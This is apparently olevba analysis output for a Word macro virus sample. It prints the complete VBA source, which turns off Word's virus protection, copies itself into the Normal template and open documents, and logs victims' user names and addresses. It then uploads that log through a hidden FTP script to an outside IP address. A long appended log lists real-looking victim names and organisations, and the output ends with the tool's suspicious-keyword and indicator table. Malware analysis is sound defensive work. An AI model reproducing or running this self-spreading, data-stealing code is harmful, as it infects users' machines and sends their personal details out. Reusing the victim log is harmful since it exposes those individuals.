olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker-based-ed78f3ea1da4745aaf379dbc90b0aaec5da8fbb4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker-based-ed78f3ea1da4745aaf379dbc90b0aaec5da8fbb4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_New()

'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
'Open Access Loves Nicky F. Also! 27/04/99 8:45:32
'Open Access Loves Nicky F. Also! 27/04/99 16:20:14
'Open Access Loves Nicky F. Also! 28/04/99 14:39:51
'Open Access Loves Nicky F. Also! 30/04/99 16:24:24
'Open Access Loves Nicky F. Also! 12/05/99 16:47:49
End Sub


'Yarra Valley Water Ltd Loves Nicky F. Also! 22/03/1999 12:32:58
'YMP137 Loves Nicky F. Also! 4/8/99 8:17:35 PM
'Staff Use Only Loves Nicky F. Also! 4/21/99 10:25:43 AM
'Open Access Loves Nicky F. Also! 27/04/99 8:55:35
'Open Access Loves Nicky F. Also! 27/04/99 14:04:27
'Open Access Loves Nicky F. Also! 27/05/99 14:50:12
End Sub`

Private Sub Label1_Click()

'Open Access Loves Nicky F. Also! 8/06/99 20:39:59
'V.U.T Loves Nicky F. Also! 9/06/99 18:53:21
'Hien Loves Nicky F. Also! 6/10/99 7:57:15 AM
'Huy Nguyen Loves Nicky F. Also! 6/28/99 11:02:24 AM
End Sub
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 06:35:17 PM - Tuesday, 26 Jan 1999
' lynn ann casey
'



' 10:10:39  - Wednesday, 27 Jan 1999
' Jo Baldock
'



' 10:49:33 AM - Monday, 1 Feb 1999
' Richard P. Panico
'



' 05:11:22 PM - Wednesday, 3 Feb 1999
' Jennifer A. Johnsonj
'



' 02:03:10  - Tuesday, 9 Feb 1999
' Coles Myer Ltd.
'



' 05:05:46  - Wednesday, 10 Feb 1999
' Coles Myer Ltd.
'



' 02:04:06 PM - Monday, 22 Feb 1999
' Sally Papworth
'



' 12:39:10 PM - Tuesday, 2 Mar 1999
' Coles Myer Ltd.
'



' 06:58:41  - Wednesday, 3 Mar 1999
' Sonja Mills
'



' 12:02:55 PM - Tuesday, 16 Mar 1999
' Coles Myer Ltd.
'



' 04:44:14 PM - Wednesday, 24 Mar 1999
' RMIT University Library
'



' 11:47:20 AM - Friday, 26 Mar 1999
' RMIT University Library
'



' 07:42:40 PM - Tuesday, 20 Apr 1999
' RMIT University Library
'



' 12:19:56  - Friday, 23 Apr 1999
' Phi
'



' 10:13:02 PM - Wednesday, 5 May 1999
' ***
'



' 06:10:32 AM - Saturday, 29 May 1999
' Huy Nguyen
'



' 07:45:25 PM - Monday, 31 May 1999
' Huy Nguyen
'



' 03:18:50 pm - Thursday, 1 Jul 1999
' VUT
'


'VUT Loves Nicky F. Also! 23/07/99 12:43:05 pm


'VUT Loves Nicky F. Also! 4/08/99 1:34:30 pm


'Building M Open Access Lab Loves Nicky F. Also! 24/08/99 14:03:32



' 11:23:46  - Friday, 27 Aug 1999
' Building M Open Access Lab
'



' 05:20:07 pm - Thursday, 23 Sep 1999
' VUT
'



' 10:17:28 am - Friday, 24 Sep 1999
' VUT
'



' 01:56:08 pm - Friday, 1 Oct 1999
' VUT
'



' 06:18:28 pm - Tuesday, 5 Oct 1999
' VUT
'



' 12:27:53 pm - Wednesday, 6 Oct 1999
' VUT
'



' 12:18:55 pm - Thursday, 7 Oct 1999
' VUT
'



' 11:20:34 am - Monday, 8 Nov 1999
' VUT
'



' 06:29:46 pm - Monday, 8 Nov 1999
' VUT
'



' 11:21:29 am - Friday, 12 Nov 1999
' VUT
'



' 02:59:31 PM - Tuesday, 16 Nov 1999
' Staff Use Only
'



' 03:40:47  - Monday, 6 Dec 1999
' Job Network Access
'



' 09:14:12  - Monday, 28 Feb 2000
' BCOT
'



' 03:14:31 PM - Saturday, 4 Mar 2000
' t
'


Private Sub Document_Open()

End Sub

' 12:52:17  - Thursday, 6 Apr 2000
' BCOT
'



' 12:20:26  - Tuesday, 16 May 2000
' BCOT
'



' 01:53:15  - Wednesday, 31 May 2000
' 1S23-14
'



' 02:07:06  - Tuesday, 6 Jun 2000
' 1S23-14
'



' 11:41:47  - Monday, 17 Jul 2000
' The Salvation Army
'



' 03:26:33  - Thursday, 7 Sep 2000
' ADECCO
'



' 01:38:30  - Saturday, 16 Sep 2000
' Compaq Computer Corporation
'



' 05:14:00  - Thursday, 28 Sep 2000
' ADECCO
'



' 04:17:37 PM - Wednesday, 8 Nov 2000
' fs080298
' CNNHS B'92 PHILIPPINES (CNSC)



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

